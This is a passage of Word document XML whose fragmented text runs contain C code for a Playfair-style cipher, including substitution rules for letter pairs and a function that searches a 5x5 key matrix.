          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e col</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1818"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="2228"/>
      </w:pPr>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">]= </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x[(row1+1)%5][co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>1];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2228"/>
      </w:pPr>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">]= </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x[(row2+1)%5][co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>2];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1818"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1818"/>
      </w:pPr>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">se </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t>ferent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>row and d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t>erent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>col</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1818"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1680" w:bottom="280" w:left="1140" w:header="0" w:footer="1185" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="7"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right="107"/>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i+</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>=2;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
      </w:pPr>
      <w:r>
        <w:br w:type="column"/>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">]= </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x[row1][co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>2];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1680" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="2" w:space="720" w:equalWidth="0">
            <w:col w:w="2041" w:space="187"/>
            <w:col w:w="6852"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">]= </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x[row2][co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>1];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j+</w:t>
      </w:r>
      <w:r>
        <w:t>=2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="580"/>
      </w:pP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t>vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>d searchMa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,foundRo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>,foundCo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>for(r=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:t>r&lt;5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:t>r++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;t</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;t</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="2228"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]==</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x[r][</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>])</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="2228"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="2936"/>
      </w:pPr>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>w1=r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>1=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2936"/>
      </w:pPr>
      <w:r>
        <w:t>foundR</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>w=1;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="2228"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="2228"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>]==</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x[r][</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
